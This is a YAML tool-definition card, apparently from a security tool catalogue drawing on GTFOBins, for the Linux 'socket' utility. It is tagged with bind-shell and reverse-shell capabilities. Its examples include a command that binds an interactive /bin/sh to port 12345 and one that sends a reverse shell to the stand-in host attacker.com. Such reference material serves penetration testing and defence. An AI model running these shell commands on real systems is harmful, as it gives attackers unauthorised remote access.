---
id: system-network-socket
namespace: system:network:socket
name: socket
description: "Create TCP/UDP communication endpoints; can transfer data and spawn shells."
author: GTFOBins
version: 1.0.0
capabilities:
- security.execution.bind-shell
- security.execution.reverse-shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- socket
parameters: []
features: []
execution:
  template: socket
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Bind a shell to a port (sudo, suid, unprivileged)
  command: socket -svp '/bin/sh -i' 12345
- description: Send a reverse shell (sudo, suid, unprivileged)
  command: socket -qvp '/bin/sh -i' attacker.com 12345
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/socket/
techniques:
- command-and-control
- execution
install:
- method: apt
  package_name: socket
  commands:
  - apt-get install -y socket
---


# socket

socket is a command-line utility. Create TCP/UDP sockets for data transfer; can also bind a shell to a port, send a reverse shell.
